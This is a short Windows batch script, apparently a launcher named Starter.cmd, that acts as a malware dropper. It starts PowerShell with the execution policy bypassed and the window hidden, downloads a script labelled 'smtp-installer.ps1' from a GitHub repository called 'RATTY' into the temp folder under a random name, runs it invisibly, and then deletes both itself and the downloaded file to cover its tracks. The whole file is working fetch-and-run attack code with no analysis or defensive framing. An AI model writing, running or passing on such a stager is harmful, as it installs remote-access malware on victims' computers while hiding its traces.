@REM @echo off
set curr=%cd%
Powershell.exe -executionpolicy Bypass -windowstyle hidden Invoke-WebRequest -Uri "raw.githubusercontent.com/carlocarlo123/RATTY/main/smtp-installer.ps1" -OutFile "%temp%\MzKrNVPboq.ps1"
cd %temp%
Powershell.exe -executionpolicy Bypass -windowstyle hidden -File  MzKrNVPboq.ps1
cd %curr%
echo %cd%
del Starter.cmd
del MzKrNVPboq.ps1